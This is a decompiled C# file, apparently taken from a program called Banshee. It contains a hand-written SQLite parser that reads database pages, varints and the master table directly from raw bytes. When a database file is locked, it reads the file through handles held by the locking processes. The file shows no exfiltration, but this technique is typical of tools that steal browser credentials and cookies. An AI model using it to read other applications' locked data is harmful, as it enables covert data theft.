﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace Banshee.Extensions
{
	// Token: 0x02000021 RID: 33
	public class SQLiteReader
	{
		// Token: 0x06000041 RID: 65 RVA: 0x00002CF4 File Offset: 0x00002CF4
		private SQLiteReader(byte[] fileBytes)
		{
			this._fileBytes = fileBytes;
			this._pageSize = this.ConvertToULong(16, 2);
			this._dbEncoding = this.ConvertToULong(56, 4);
			this.ReadMasterTable(100L);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00002D50 File Offset: 0x00002D50
		public static SQLiteReader Create(string fileName, int retry = 0)
		{
			byte[] array = NullableValue.Call<byte[]>(() => File.ReadAllBytes(fileName));
			if (array != null)
			{
				return new SQLiteReader(array);
			}
			if (retry > 0)
			{
				return null;
			}
			Process[] array2 = LockHelper.GetLockingProcesses(fileName).ToArray<Process>();
			try
			{
				IEnumerable<Process> source = array2;
				Func<Process, ProcessFileHandle> <>9__1;
				Func<Process, ProcessFileHandle> selector;
				if ((selector = <>9__1) == null)
				{
					selector = (<>9__1 = ((Process process) => LockHelper.FindFileHandle(fileName, process)));
				}
				foreach (ProcessFileHandle fileHandle in from foundHandle in source.Select(selector)
				where foundHandle.ProcessID != 0
				select foundHandle)
				{
					byte[] array3 = LockHelper.ReadLockedFile(fileHandle);
					if (array3 != null)
					{
						return new SQLiteReader(array3);
					}
				}
			}
			catch
			{
				return null;
			}
			Thread.Sleep(100);
			return SQLiteReader.Create(fileName, retry + 1);
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00002E5C File Offset: 0x00002E5C
		public object GetValue(int rowNum, int field)
		{
			object result;
			try
			{
				if (rowNum >= this._tableEntries.Length)
				{
					result = null;
				}
				else
				{
					result = ((field >= this._tableEntries[rowNum].Content.Length) ? null : this._tableEntries[rowNum].Content[field]);
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00002EC0 File Offset: 0x00002EC0
		public int GetRowCount()
		{
			return this._tableEntries.Length;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00002ECC File Offset: 0x00002ECC
		private bool ReadTableFromOffset(ulong offset)
		{
			bool result;
			try
			{
				byte b = this._fileBytes[(int)(checked((IntPtr)offset))];
				if (b != 5)
				{
					if (b == 13)
					{
						uint num = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
						int num2 = 0;
						if (this._tableEntries != null)
						{
							num2 = this._tableEntries.Length;
							Array.Resize<SQLiteReader.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
						}
						else
						{
							this._tableEntries = new SQLiteReader.TableEntry[num + 1U];
						}
						for (uint num3 = 0U; num3 <= num; num3 += 1U)
						{
							ulong num4 = this.ConvertToULong((int)offset + 8 + (int)(num3 * 2U), 2);
							if (offset != 100UL)
							{
								num4 += offset;
							}
							int num5 = this.Gvl((int)num4);
							this.Cvl((int)num4, num5);
							int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
							this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
							ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
							int num8 = this.Gvl((int)num7);
							int num9 = num8;
							long num10 = this.Cvl((int)num7, num8);
							SQLiteReader.RecordHeaderField[] array = null;
							long num11 = (long)(num7 - (ulong)((long)num8) + 1UL);
							int num12 = 0;
							while (num11 < num10)
							{
								Array.Resize<SQLiteReader.RecordHeaderField>(ref array, num12 + 1);
								int num13 = num9 + 1;
								num9 = this.Gvl(num13);
								array[num12].Type = this.Cvl(num13, num9);
								array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[num12].Type))]) : ((ulong)((!SQLiteReader.IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
								num11 = num11 + (long)(num9 - num13) + 1L;
								num12++;
							}
							if (array != null)
							{
								this._tableEntries[num2 + (int)num3].Content = new object[array.Length];
								int num14 = 0;
								for (int i = 0; i <= array.Length - 1; i++)
								{
									if (array[i].Type > 9L)
									{
										if (!SQLiteReader.IsOdd(array[i].Type))
										{
											long dbEncoding = (long)this._dbEncoding;
											long num15 = dbEncoding - 1L;
											if (num15 <= 2L)
											{
												switch ((uint)num15)
												{
												case 0U:
													this._tableEntries[num2 + (int)num3].Content[i] = this._fileBytes.Skip((int)(num7 + (ulong)num10 + (ulong)((long)num14))).Take((int)array[i].Size).ToArray<byte>();
													break;
												case 1U:
													this._tableEntries[num2 + (int)num3].Content[i] = this._fileBytes.Skip((int)(num7 + (ulong)num10 + (ulong)((long)num14))).Take((int)array[i].Size).ToArray<byte>();
													break;
												case 2U:
													this._tableEntries[num2 + (int)num3].Content[i] = this._fileBytes.Skip((int)(num7 + (ulong)num10 + (ulong)((long)num14))).Take((int)array[i].Size).ToArray<byte>();
													break;
												}
											}
										}
										else
										{
											this._tableEntries[num2 + (int)num3].Content[i] = this._fileBytes.Skip((int)(num7 + (ulong)num10 + (ulong)((long)num14))).Take((int)array[i].Size).ToArray<byte>();
										}
									}
									else
									{
										this._tableEntries[num2 + (int)num3].Content[i] = this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
									}
									num14 += (int)array[i].Size;
								}
							}
						}
					}
				}
				else
				{
					uint num16 = (uint)(this.ConvertToULong((int)(offset + 3UL), 2) - 1UL);
					for (uint num17 = 0U; num17 <= num16; num17 += 1U)
					{
						uint num18 = (uint)this.ConvertToULong((int)offset + 12 + (int)(num17 * 2U), 2);
						this.ReadTableFromOffset((this.ConvertToULong((int)(offset + (ulong)num18), 4) - 1UL) * this._pageSize);
					}
					this.ReadTableFromOffset((this.ConvertToULong((int)(offset + 8UL), 4) - 1UL) * this._pageSize);
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00003364 File Offset: 0x00003364
		private void ReadMasterTable(long offset)
		{
			try
			{
				byte b = this._fileBytes[(int)(checked((IntPtr)offset))];
				if (b != 5)
				{
					if (b == 13)
					{
						ulong num = this.ConvertToULong((int)offset + 3, 2) - 1UL;
						int num2 = 0;
						if (this._masterTableEntries != null)
						{
							num2 = this._masterTableEntries.Length;
							Array.Resize<SQLiteReader.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
						}
						else
						{
							this._masterTableEntries = new SQLiteReader.SqliteMasterEntry[num + 1UL];
						}
						for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
						{
							ulong num4 = this.ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
							if (offset != 100L)
							{
								num4 += (ulong)offset;
							}
							int num5 = this.Gvl((int)num4);
							this.Cvl((int)num4, num5);
							int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
							this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
							ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
							int num8 = this.Gvl((int)num7);
							int num9 = num8;
							long num10 = this.Cvl((int)num7, num8);
							long[] array = new long[5];
							for (int i = 0; i <= 4; i++)
							{
								int startIdx = num9 + 1;
								num9 = this.Gvl(startIdx);
								array[i] = this.Cvl(startIdx, num9);
								array[i] = (long)((array[i] <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]) : ((ulong)((!SQLiteReader.IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
							}
							long dbEncoding = (long)this._dbEncoding;
							long num11 = dbEncoding - 1L;
							if (num11 <= 2L)
							{
								switch ((uint)num11)
								{
								case 0U:
									this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									break;
								case 1U:
									this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									break;
								case 2U:
									this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									break;
								}
							}
							this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
							dbEncoding = (long)this._dbEncoding;
							long num12 = dbEncoding - 1L;
							if (num12 <= 2L)
							{
								switch ((uint)num12)
								{
								case 0U:
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
									break;
								case 1U:
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
									break;
								case 2U:
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
									break;
								}
							}
						}
					}
				}
				else
				{
					uint num13 = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
					for (int j = 0; j <= (int)num13; j++)
					{
						uint num14 = (uint)this.ConvertToULong((int)offset + 12 + j * 2, 2);
						if (offset == 100L)
						{
							this.ReadMasterTable((long)((this.ConvertToULong((int)num14, 4) - 1UL) * this._pageSize));
						}
						else
						{
							this.ReadMasterTable((long)((this.ConvertToULong((int)(offset + (long)((ulong)num14)), 4) - 1UL) * this._pageSize));
						}
					}
					this.ReadMasterTable((long)((this.ConvertToULong((int)offset + 8, 4) - 1UL) * this._pageSize));
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000037B4 File Offset: 0x000037B4
		public bool ReadTable(string tableName)
		{
			bool result;
			try
			{
				int num = -1;
				if (this._masterTableEntries == null)
				{
					result = false;
				}
				else
				{
					for (int i = 0; i <= this._masterTableEntries.Length; i++)
					{
						if (string.Compare(this._masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
						{
							num = i;
							break;
						}
					}
					if (num == -1)
					{
						result = false;
					}
					else
					{
						string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
						{
							','
						});
						for (int j = 0; j <= array.Length - 1; j++)
						{
							array[j] = array[j].TrimStart(Array.Empty<char>());
							int num2 = array[j].IndexOf(' ');
							if (num2 > 0)
							{
								array[j] = array[j].Substring(0, num2);
							}
							if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
							{
								Array.Resize<string>(ref this._fieldNames, j + 1);
								this._fieldNames[j] = array[j];
							}
						}
						result = this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
					}
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00003918 File Offset: 0x00003918
		private ulong ConvertToULong(int startIndex, int size)
		{
			ulong result;
			try
			{
				if (size > 8 | size == 0)
				{
					result = 0UL;
				}
				else
				{
					ulong num = 0UL;
					for (int i = 0; i <= size - 1; i++)
					{
						num = (num << 8 | (ulong)this._fileBytes[startIndex + i]);
					}
					result = num;
				}
			}
			catch
			{
				result = 0UL;
			}
			return result;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00003974 File Offset: 0x00003974
		private int Gvl(int startIdx)
		{
			int result;
			try
			{
				if (startIdx > this._fileBytes.Length)
				{
					result = 0;
				}
				else
				{
					for (int i = startIdx; i <= startIdx + 8; i++)
					{
						if (i > this._fileBytes.Length - 1)
						{
							return 0;
						}
						if ((this._fileBytes[i] & 128) != 128)
						{
							return i;
						}
					}
					result = startIdx + 8;
				}
			}
			catch
			{
				result = 0;
			}
			return result;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000039E4 File Offset: 0x000039E4
		private long Cvl(int startIdx, int endIdx)
		{
			long result;
			try
			{
				endIdx++;
				byte[] array = new byte[8];
				int num = endIdx - startIdx;
				bool flag = false;
				if (num == 0 | num > 9)
				{
					result = 0L;
				}
				else if (num != 1)
				{
					if (num == 9)
					{
						flag = true;
					}
					int num2 = 1;
					int num3 = 7;
					int num4 = 0;
					if (flag)
					{
						array[0] = this._fileBytes[endIdx - 1];
						endIdx--;
						num4 = 1;
					}
					for (int i = endIdx - 1; i >= startIdx; i += -1)
					{
						if (i - 1 >= startIdx)
						{
							array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
							num2++;
							num4++;
							num3--;
						}
						else if (!flag)
						{
							array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
						}
					}
					result = BitConverter.ToInt64(array, 0);
				}
				else
				{
					array[0] = (this._fileBytes[startIdx] & 127);
					result = BitConverter.ToInt64(array, 0);
				}
			}
			catch
			{
				result = 0L;
			}
			return result;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003B08 File Offset: 0x00003B08
		private static bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x0400005D RID: 93
		private readonly byte[] _sqlDataTypeSize = new byte[]
		{
			0,
			1,
			2,
			3,
			4,
			6,
			8,
			8,
			0,
			0
		};

		// Token: 0x0400005E RID: 94
		private readonly ulong _dbEncoding;

		// Token: 0x0400005F RID: 95
		private readonly byte[] _fileBytes;

		// Token: 0x04000060 RID: 96
		private readonly ulong _pageSize;

		// Token: 0x04000061 RID: 97
		private string[] _fieldNames;

		// Token: 0x04000062 RID: 98
		private SQLiteReader.SqliteMasterEntry[] _masterTableEntries;

		// Token: 0x04000063 RID: 99
		private SQLiteReader.TableEntry[] _tableEntries;

		// Token: 0x02000022 RID: 34
		private struct RecordHeaderField
		{
			// Token: 0x04000064 RID: 100
			public long Size;

			// Token: 0x04000065 RID: 101
			public long Type;
		}

		// Token: 0x02000023 RID: 35
		private struct TableEntry
		{
			// Token: 0x04000066 RID: 102
			public object[] Content;
		}

		// Token: 0x02000024 RID: 36
		private struct SqliteMasterEntry
		{
			// Token: 0x04000067 RID: 103
			public string ItemName;

			// Token: 0x04000068 RID: 104
			public long RootNum;

			// Token: 0x04000069 RID: 105
			public string SqlStatement;
		}
	}
}
